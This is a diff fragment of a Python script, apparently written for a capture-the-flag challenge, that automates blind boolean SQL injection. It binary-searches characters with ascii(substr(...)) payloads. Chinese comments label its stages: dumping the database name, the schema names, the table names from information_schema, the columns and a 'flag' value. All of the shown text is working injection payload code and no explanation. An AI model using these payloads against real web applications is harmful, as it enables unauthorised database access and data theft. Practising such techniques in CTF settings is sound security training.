@@ -25,7 +25,9 @@ while True:
         # payload = f"if(ascii(substr((select(flag)from(flag)),{i},1))>{mid},1,2)"  # 第一种解法(if判断)
         # payload = f"0^(ascii(substr((select(flag)from(flag)),{i},1))>{mid})"  # 第二种解法(异或)
 
-        # payload = f"0^(ascii(substr((database()),{i},1))>{mid})" # 爆库
+        # 爆库
+        # payload = f"0^(ascii(substr((database()),{i},1))>{mid})"
+        # payload = f"0^(ascii(substr((select(schema_name)from(information_schema_schemata)),{i},1))>{mid})"
         # 爆表
         payload = f"0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))>{mid})"
         # 爆列
